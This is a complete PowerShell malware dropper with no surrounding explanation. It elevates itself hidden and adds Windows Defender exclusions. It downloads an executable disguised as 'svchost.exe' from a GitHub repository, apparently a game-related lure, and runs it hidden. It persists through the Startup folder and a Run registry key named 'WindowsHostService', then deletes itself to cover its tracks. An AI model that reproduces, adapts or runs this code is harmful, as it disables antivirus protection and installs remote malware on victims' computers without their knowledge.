$FILE_URL = "https://github.com/qbekun/cs2/raw/refs/heads/main/svchost.exe"
$TEMP_PATH = "$env:TEMP\svchost.exe"
$STARTUP_FOLDER = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
    $process = Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden -PassThru
    exit
}
try {
    Add-MpPreference -ExclusionPath $STARTUP_FOLDER -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $TEMP_PATH -ErrorAction SilentlyContinue
}
catch {}
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($FILE_URL, $TEMP_PATH)
}
catch {}
try {
    Copy-Item -Path $TEMP_PATH -Destination "$STARTUP_FOLDER\svchost.exe" -Force -ErrorAction SilentlyContinue
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsHostService" -Value $TEMP_PATH -ErrorAction SilentlyContinue
}
catch {}
try {
    Start-Process -FilePath $TEMP_PATH -WindowStyle Hidden
}
catch {}
try {
    $scriptPath = $MyInvocation.MyCommand.Path
    $deleteCmd = "Remove-Item -Path `"$scriptPath`" -Force -ErrorAction SilentlyContinue"
    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$deleteCmd`""
}
catch {}
